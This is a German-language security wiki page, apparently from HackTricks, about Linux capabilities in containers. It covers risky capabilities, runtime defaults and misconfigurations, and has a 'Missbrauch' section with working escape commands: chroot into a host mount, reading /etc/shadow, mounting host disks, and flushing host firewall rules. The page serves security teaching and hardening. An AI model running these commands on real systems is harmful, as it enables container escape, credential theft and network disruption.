# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux Capabilities sind eines der wichtigsten Elemente der Container-Sicherheit, weil sie eine subtile, aber grundlegende Frage beantworten: **was bedeutet "root" innerhalb eines Containers wirklich?** Auf einem normalen Linux-System implizierte UID 0 historisch eine sehr breite Rechteausstattung. In modernen Kerneln wird dieses Privileg in kleinere Einheiten zerlegt, die Capabilities genannt werden. Ein Prozess kann als root laufen und trotzdem viele mächtige Operationen nicht ausführen können, wenn die entsprechenden Capabilities entfernt wurden.

Container sind stark von dieser Unterscheidung abhängig. Viele Workloads werden weiterhin als UID 0 innerhalb des Containers gestartet, aus Kompatibilitäts- oder Einfachheitsgründen. Ohne das Entfernen von Capabilities wäre das viel zu gefährlich. Durch das Entfernen von Capabilities kann ein containerisierter Root-Prozess weiterhin viele gewöhnliche Aufgaben im Container ausführen, während ihm sensiblere Kernel-Operationen verweigert werden. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch "host root" oder gar umfassende Kernel-Rechte. Die Capabilities-Sets entscheiden, wie viel diese Root-Identität tatsächlich wert ist.

Für die vollständige Linux-Capabilities-Referenz und viele Abuse-Beispiele, siehe:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets verfolgt, darunter permitted, effective, inheritable, ambient und bounding. Für viele Container-Bewertungen sind die genauen Kernel-Semantiken jedes Sets weniger unmittelbar wichtig als die praktische Endfrage: **Welche privilegierten Operationen kann dieser Prozess gerade erfolgreich ausführen, und welche zukünftigen Privilegiengewinne sind noch möglich?**

Der Grund, warum das wichtig ist, ist, dass viele Breakout-Techniken eigentlich Capability-Probleme sind, die als Container-Probleme getarnt sind. Eine Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionalität zugreifen, die ein normaler Container-Root-Prozess nicht anfassen sollte. Eine Workload mit `CAP_NET_ADMIN` wird viel gefährlicher, wenn sie auch den Host-Netzwerknamespace teilt. Eine Workload mit `CAP_SYS_PTRACE` wird viel interessanter, wenn sie Host-Prozesse sehen kann durch Host-PID-Sharing. In Docker oder Podman erscheint das möglicherweise als `--pid=host`; in Kubernetes erscheint es üblicherweise als `hostPID: true`.

Mit anderen Worten lässt sich das Capabilities-Set nicht isoliert bewerten. Es muss zusammen mit namespaces, seccomp und MAC-Policy betrachtet werden.

## Lab

Eine sehr direkte Möglichkeit, Capabilities innerhalb eines Containers zu inspizieren, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können auch einen restriktiveren container mit einem vergleichen, dem alle capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Wirkung einer engen Ergänzung zu sehen, versuchen Sie, alles zu entfernen und nur eine capability wieder hinzuzufügen:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente zeigen, dass eine Runtime nicht einfach einen Boolean namens "privileged" umschaltet. Sie formt die tatsächlich verfügbare Privilegienoberfläche des Prozesses.

## Hochriskante Capabilities

Obwohl viele Capabilities je nach Ziel relevant sein können, sind einige wenige in container escape analysis immer wieder wichtig.

**`CAP_SYS_ADMIN`** ist diejenige, die Verteidiger mit der größten Skepsis behandeln sollten. Sie wird oft als "the new root" beschrieben, weil sie eine enorme Menge an Funktionalität freischaltet, einschließlich mount-bezogener Operationen, namespace-sensitivem Verhalten und vielen Kernel-Pfaden, die Containern niemals leichtfertig ausgesetzt werden sollten. Wenn ein Container `CAP_SYS_ADMIN`, schwaches seccomp und keine starke MAC-Einschränkung hat, werden viele klassische Breakout-Pfade deutlich realistischer.

**`CAP_SYS_PTRACE`** ist relevant, wenn Prozesssichtbarkeit besteht, besonders wenn der PID namespace mit dem Host oder mit interessanten Nachbar-Workloads geteilt wird. Es kann Sichtbarkeit in Manipulation verwandeln.

**`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** sind in netzwerkfokussierten Umgebungen wichtig. In einem isolierten bridge network können sie bereits riskant sein; in einem geteilten host network namespace sind sie viel problematischer, weil die Workload möglicherweise das Host-Netzwerk neu konfigurieren, sniff, spoof oder lokale Traffic-Flüsse stören kann.

**`CAP_SYS_MODULE`** ist in der Regel katastrophal in einer rootful-Umgebung, weil das Laden von Kernel-Modulen effektiv Kontrolle über den Host-Kernel bedeutet. Es sollte in einer allgemeinen container workload nahezu nie vorkommen.

## Runtime-Verwendung

Docker, Podman, containerd-based Stacks und CRI-O nutzen alle Capability-Kontrollen, aber die Defaults und Management-Interfaces unterscheiden sich. Docker macht sie sehr direkt über Flags wie `--cap-drop` und `--cap-add` verfügbar. Podman bietet ähnliche Kontrollen und profitiert häufig zusätzlich von rootless execution als weiterer Sicherheitsschicht. Kubernetes macht Capability-Ergänzungen und -Entfernungen über den Pod- oder Container-`securityContext` sichtbar. System-Container-Umgebungen wie LXC/Incus verlassen sich ebenfalls auf Capability-Control, aber die breitere Host-Integration dieser Systeme verleitet Betreiber oft dazu, Defaults aggressiver zu lockern, als sie es in einer App-Container-Umgebung tun würden.

Dasselbe Prinzip gilt für alle: Eine Capability, die technisch möglich zu gewähren ist, ist nicht notwendigerweise eine, die gewährt werden sollte. Viele reale Zwischenfälle beginnen damit, dass ein Betreiber eine Capability hinzufügt, einfach weil eine Workload unter einer strengeren Konfiguration fehlgeschlagen ist und das Team eine schnelle Lösung brauchte.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker/Podman-ähnlichen CLIs, aber das ist nicht der einzige. In der Praxis ist ein häufigeres Problem, ein oder zwei extrem mächtige Capabilities, insbesondere `CAP_SYS_ADMIN`, zu gewähren, um "die Anwendung zum Laufen zu bringen", ohne die Namespace-, seccomp- und Mount-Auswirkungen zu verstehen. Ein weiterer häufiger Fehler ist die Kombination zusätzlicher Capabilities mit Host-Namespace-Sharing. In Docker oder Podman kann sich das als `--pid=host`, `--network=host` oder `--userns=host` zeigen; in Kubernetes tritt die äquivalente Exposition typischerweise durch Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true` auf. Jede dieser Kombinationen ändert, was die Capability tatsächlich beeinflussen kann.

Es ist auch häufig, dass Administratoren glauben, weil eine Workload nicht vollständig `--privileged` ist, sei sie dennoch sinnvoll eingeschränkt. Manchmal ist das wahr, aber manchmal ist die effektive Haltung bereits nahe genug an privileged, dass die Unterscheidung operativ keine Rolle mehr spielt.

## Missbrauch

Der erste praktische Schritt ist, die effektive Capability-Menge zu enumerieren und sofort die fähigkeitsspezifischen Aktionen zu testen, die für escape oder den Zugriff auf Host-Informationen relevant wären:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste zuerst mount-based abuse und host filesystem access, weil dies einer der häufigsten breakout enablers ist:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Wenn `CAP_SYS_PTRACE` vorhanden ist und der Container interessante Prozesse sehen kann, prüfen Sie, ob sich die Capability zur Prozessinspektion nutzen lässt:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden ist, testen Sie, ob der workload den sichtbaren network stack manipulieren oder zumindest nützliche network intelligence sammeln kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wenn ein capability-Test erfolgreich ist, kombiniere ihn mit der Namespace-Situation. Eine Capability, die in einem isolierten Namespace lediglich riskant wirkt, kann sofort zu einem Escape- oder Host-Recon-Primitive werden, wenn der Container außerdem host PID, host network oder host mounts teilt.

### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Wenn der Container `CAP_SYS_ADMIN` und einen beschreibbaren bind mount des host filesystem wie `/host` hat, ist der Escape-Pfad oft geradlinig:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot` erfolgreich ist, werden Befehle nun im Kontext des Root-Dateisystems des Hosts ausgeführt:
```bash
id
hostname
cat /etc/shadow | head
```
Wenn `chroot` nicht verfügbar ist, lässt sich dasselbe Ergebnis oft erzielen, indem man das `binary` über den gemounteten Verzeichnisbaum aufruft:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Volles Beispiel: `CAP_SYS_ADMIN` + Gerätezugriff

Wenn ein Blockgerät des Hosts offengelegt ist, kann `CAP_SYS_ADMIN` es in direkten Zugriff auf das Dateisystem des Hosts umwandeln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Vollständiges Beispiel: `CAP_NET_ADMIN` + Host-Netzwerk

Diese Kombination führt nicht immer direkt zu host root, kann aber den Netzwerkstack des Hosts vollständig neu konfigurieren:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das kann denial of service, traffic interception oder den Zugriff auf Dienste ermöglichen, die zuvor gefiltert wurden.

## Prüfungen

Das Ziel der capability checks ist nicht nur, rohe Werte auszulesen, sondern zu verstehen, ob der Prozess genügend Privilegien hat, um seine aktuelle namespace- und mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was hier interessant ist:

- `capsh --print` ist der einfachste Weg, hochriskante Capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die `CapEff`-Zeile in `/proc/self/status` zeigt, was aktuell tatsächlich wirksam ist, nicht nur, was in anderen Sets verfügbar sein könnte.
- Ein Capability-Dump wird deutlich wichtiger, wenn der Container außerdem Host-PID-, Netzwerk- oder Benutzer-Namespaces teilt oder beschreibbare Host-Mounts hat.

Nach dem Sammeln der rohen Capability-Informationen ist der nächste Schritt die Interpretation. Kläre, ob der Prozess root ist, ob Benutzer-Namespaces aktiv sind, ob Host-Namespaces geteilt werden, ob seccomp durchgesetzt wird und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein Capability-Set für sich allein ist nur ein Teil der Geschichte, aber es ist oft der Teil, der erklärt, warum ein container breakout funktioniert und ein anderer beim gleichen scheinbaren Ausgangspunkt scheitert.

## Standardwerte zur Laufzeit

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes Capability-Set | Docker verwendet standardmäßig eine Erlaubnisliste von Capabilities und entfernt die übrigen | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes Capability-Set | Podman-Container sind standardmäßig unprivileged und verwenden ein reduziertes Capability-Modell | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erbt die Runtime-Standardwerte, sofern nicht geändert | Wenn keine `securityContext.capabilities` angegeben sind, erhält der Container das standardmäßige Capability-Set des Runtimes | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Meistens Runtime-Default | Das effektive Set hängt vom Runtime plus der Pod-Spezifikation ab | wie in der Kubernetes-Zeile; direkte OCI/CRI-Konfiguration kann ebenfalls Capabilities explizit hinzufügen |

Für Kubernetes ist wichtig, dass die API kein universelles standardmäßiges Capability-Set definiert. Wenn der Pod keine Capabilities hinzufügt oder entfernt, erbt die Workload das Runtime-Default dieses Nodes.
